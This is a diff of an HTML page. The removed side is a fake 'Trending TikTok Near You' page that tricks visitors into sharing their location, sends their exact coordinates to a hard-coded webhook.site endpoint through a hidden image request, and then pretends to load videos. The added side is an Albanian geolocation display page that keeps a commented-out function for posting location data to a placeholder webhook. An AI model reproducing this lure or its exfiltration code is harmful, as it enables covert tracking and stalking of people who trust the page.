@@ -3,147 +3,118 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trending TikTok Near You</title>
+    <title>Local Geolocation Finder</title>
+    <!-- Tailwind CSS për dizajn të pastër dhe modern -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #000000;
-            color: #ffffff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-            box-sizing: border-box;
-        }
-        .card {
-            background: #121212;
-            border: 1px solid #282828;
-            padding: 24px;
-            border-radius: 16px;
-            text-align: center;
-            max-width: 400px;
-            width: 100%;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
-        }
-        .video-preview {
-            width: 100%;
-            height: 200px;
-            background: #1f1f1f;
-            border-radius: 12px;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            margin-bottom: 20px;
-            position: relative;
-            overflow: hidden;
-            border: 1px solid #333;
-        }
-        .play-icon {
-            width: 50px;
-            height: 50px;
-            background: rgba(254, 44, 85, 0.9);
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-bottom: 10px;
-        }
-        .play-icon::after {
-            content: "";
-            display: block;
-            width: 0;
-            height: 0;
-            border-top: 8px solid transparent;
-            border-bottom: 8px solid transparent;
-            border-left: 14px solid #ffffff;
-            margin-left: 3px;
-        }
-        .preview-text {
-            font-size: 13px;
-            color: #aaa;
-        }
-        h2 { 
-            font-size: 18px; 
-            margin-bottom: 8px; 
-            color: #fff;
-        }
-        p { 
-            color: #8a8a8a; 
-            font-size: 13px; 
-            line-height: 1.5;
-            margin-bottom: 20px;
-        }
-        .btn {
-            background: linear-gradient(90deg, #FE2C55, #25F4EE);
-            color: #ffffff;
-            border: none;
-            padding: 14px 20px;
-            font-size: 15px;
-            border-radius: 25px;
-            cursor: pointer;
-            font-weight: 700;
-            width: 100%;
-            box-shadow: 0 4px 12px rgba(254, 44, 85, 0.3);
-            transition: transform 0.2s;
-        }
-        .btn:active {
-            transform: scale(0.98);
-        }
-        #status { 
-            margin-top: 15px; 
-            font-size: 12px; 
-            color: #8a8a8a; 
+        .glass-card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
     </style>
 </head>
-<body>
+<body class="bg-gradient-to-br from-slate-950 via-purple-950 to-slate-900 min-h-screen text-white flex items-center justify-center p-4">
 
-    <div class="card">
-        <div class="video-preview">
-            <div class="play-icon"></div>
-            <div class="preview-text">Viral Videos Near Your Area</div>
+    <div class="max-w-md w-full glass-card rounded-3xl p-8 shadow-2xl text-center relative overflow-hidden">
+        
+        <!-- Element dekorativ sfondi -->
+        <div class="absolute -top-24 -right-24 w-48 h-48 bg-purple-500/20 rounded-full blur-3xl pointer-events-none"></div>
+        <div class="absolute -bottom-24 -left-24 w-48 h-48 bg-pink-500/20 rounded-full blur-3xl pointer-events-none"></div>
+
+        <!-- Ikona -->
+        <div class="w-20 h-20 bg-gradient-to-tr from-purple-600 to-pink-500 rounded-2xl mx-auto flex items-center justify-center shadow-lg shadow-purple-500/30 mb-6">
+            <i class="fa-solid fa-location-dot text-3xl text-white animate-bounce"></i>
         </div>
 
-        <h2>Share Location to View Local Trends</h2>
-        <p>Allow location access to discover the most viral TikTok videos and local creators trending in your city right now.</p>
-        
-        <button class="btn" onclick="sendLocation()">Share Location & Watch</button>
-        <div id="status"></div>
+        <!-- Titulli & Përshkrimi -->
+        <h1 class="text-2xl font-bold tracking-tight mb-3">Zbuloni Vendndodhjen Tuaj</h1>
+        <p class="text-slate-300 text-sm leading-relaxed mb-8">
+            Lejoni qasjen në vendndodhje për të shfaqur koordinatat tuaja dhe për të aktivizuar shërbimet e bazuara në zonë.
+        </p>
+
+        <!-- Butoni i Aktivizimit -->
+        <button id="getLocationBtn" onclick="fetchLocation()" class="w-full py-4 px-6 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500 font-semibold rounded-xl shadow-lg shadow-purple-600/30 transition-all duration-200 transform active:scale-95 flex items-center justify-center gap-2 mb-4">
+            <i class="fa-solid fa-compass"></i>
+            <span>Lejo Vendndodhjen</span>
+        </button>
+
+        <!-- Zona ku shfaqen të dhënat e lokacionit -->
+        <div id="resultContainer" class="hidden mt-6 p-4 rounded-xl bg-black/40 border border-white/10 text-left text-sm space-y-2">
+            <p class="text-purple-400 font-semibold flex items-center gap-2">
+                <i class="fa-solid fa-circle-check"></i> Lokacioni u sigurua me sukses:
+            </p>
+            <div id="locationData" class="text-slate-300 font-mono text-xs space-y-1">
+                <!-- Këtu shfaqen latitude/longitude -->
+            </div>
+        </div>
+
+        <!-- Statusi ose Mesazhet e Gabimit -->
+        <p id="statusMsg" class="text-xs text-slate-400 mt-4"></p>
     </div>
 
     <script>
-        function sendLocation() {
-            const statusDiv = document.getElementById("status");
-            const webhookEndpoint = "https://webhook.site/173a0605-312d-4be1-b9aa-891895e5a34e";
+        function fetchLocation() {
+            const btn = document.getElementById('getLocationBtn');
+            const statusMsg = document.getElementById('statusMsg');
+            const resultContainer = document.getElementById('resultContainer');
+            const locationData = document.getElementById('locationData');
 
-            if ("geolocation" in navigator) {
-                statusDiv.innerText = "Accessing your device location...";
-
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-
-                        const img = new Image();
-                        img.src = `${webhookEndpoint}?lat=${lat}&lon=${lon}&maps=${encodeURIComponent(googleMapsUrl)}`;
-                        
-                        statusDiv.style.color = "#25F4EE";
-                        statusDiv.innerText = "Location verified! Loading local viral feed...";
-                    },
-                    function(error) {
-                        statusDiv.style.color = "#FE2C55";
-                        statusDiv.innerText = "Location permission denied.";
-                    },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
-            } else {
-                statusDiv.innerText = "Geolocation is not supported by your browser.";
+            if (!navigator.geolocation) {
+                statusMsg.textContent = "Shfletuesi juaj nuk e mbështet Geolocation.";
+                statusMsg.classList.add('text-red-400');
+                return;
             }
+
+            btn.disabled = true;
+            btn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i> Duke u lidhur...`;
+            statusMsg.textContent = "Ju lutem pranoni kërkesën për vendndodhje në shfletues.";
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+
+                    // Shfaq të dhënat në kuti
+                    resultContainer.classList.remove('hidden');
+                    locationData.innerHTML = `
+                        <div><strong>Gjerësia (Lat):</strong> ${lat}</div>
+                        <div><strong>Gjatësia (Lon):</strong> ${lon}</div>
+                        <div><strong>Saktësia:</strong> rreth ${Math.round(accuracy)} metra</div>
+                    `;
+
+                    statusMsg.textContent = "Vendndodhja u mor me sukses!";
+                    statusMsg.className = "text-xs text-emerald-400 mt-4";
+                    
+                    btn.innerHTML = `<i class="fa-solid fa-check"></i> Sukses`;
+                    btn.classList.from = "from-purple-600";
+                    btn.classList.to = "to-pink-600";
+
+                    // Opsionale: Nëse dëshiron t'i dërgosh te ndonjë webhook (si Webhook.site)
+                    // sendToWebhook({ lat, lon, accuracy });
+                },
+                (error) => {
+                    btn.disabled = false;
+                    btn.innerHTML = `<i class="fa-solid fa-compass"></i> Progo Përsëri`;
+                    statusMsg.textContent = "Gabim: " + error.message;
+                    statusMsg.className = "text-xs text-red-400 mt-4";
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
         }
+
+        // Funksioni opsional për Webhook (nëse ju duhet për provë/detyrë)
+        /*
+        function sendToWebhook(data) {
+            fetch('https://webhook.site/KODI-JUAJ-KETU', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(err => console.log(err));
+        }
+        */
     </script>
 </body>
 </html>
